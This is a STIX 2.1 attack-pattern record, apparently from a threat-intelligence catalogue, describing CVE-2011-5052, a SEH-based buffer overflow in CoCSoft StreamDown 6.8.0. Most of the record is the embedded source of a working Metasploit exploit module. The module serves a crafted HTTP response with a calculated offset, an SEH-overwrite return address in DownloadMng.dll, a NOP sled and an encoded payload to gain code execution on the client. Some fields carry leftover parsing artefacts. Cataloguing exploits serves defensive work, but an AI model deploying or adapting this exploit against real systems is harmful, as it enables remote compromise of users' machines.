{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0e23af5b-f843-4309-bbdd-470385539db5",
    "created": "2024-08-14T16:45:46.903701Z",
    "modified": "2024-08-14T16:45:46.903705Z",
    "name": "CoCSoft StreamDown 6.8.0 Buffer Overflow",
    "description": " Stream Down 6.8.0 seh based buffer overflow triggered when processing the server response packet. During the overflow a structured exception handler is overwritten. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/stream_down_bof.rb",
            "external_id": "stream_down_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5052"
        },
        {
            "source_name": "reference",
            "url": "http://www.dark-masters.tk/"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20121024141958/http://secunia.com/advisories/47343"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CoCSoft StreamDown 6.8.0 Buffer Overflow',\n      'Description'    => %q{\n        Stream Down 6.8.0 seh based buffer overflow triggered when processing\n        the server response packet. During the overflow a structured exception\n        handler is overwritten.\n      },\n      'Author'         => 'Fady Mohamed Osman <fady.mohamed.osman[at]gmail.com>',\n      'References'\t =>\n        [\n          ['CVE', '2011-5052'],\n          ['OSVDB', '78043'],\n          ['BID', '51190'],\n          ['URL', 'http://www.dark-masters.tk/'],\n          ['URL', 'http://web.archive.org/web/20121024141958/http://secunia.com/advisories/47343'],\n          ['EDB', '18283']\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\xff\\x0a\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'StreamDown 6.8.0',\n            {\n              'Offset' => 16388,\n              'Ret'    => 0x10019448 #POP/POP/RET in DownloadMng.dll\n            }\n          ],\n        ],\n        'DisclosureDate' => '2011-12-27', # as an actual security bug\n        'DefaultTarget' => 0,\n      'License'       => MSF_LICENSE\n    ))\n  end\n\n  def on_request_uri(cli,request)\n    vprint_status(\"Requested: #{request.uri}\")\n\n    # No point to continue if the client isn't what we interested in\n    ua = request.headers['User-Agent']\n    if ua !~ /CoCSoft Stream Download/i\n      print_error(\"Target not supported: #{ua}\")\n      send_not_found(cli)\n      return\n    end\n\n    nseh = \"\\xeb\\x06\" + rand_text_alpha(2)\n    seh = [target.ret].pack('V')\n    offset_to_nseh = target['Offset']\n    nops = make_nops(10)\n    sploit = rand_text_alpha(offset_to_nseh) + nseh + seh + nops + payload.encoded\n    cli.put(sploit)\n    close_client(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-27, # as an actual security bug",
    "x_mitre_platforms": [
        "win'"
    ]
}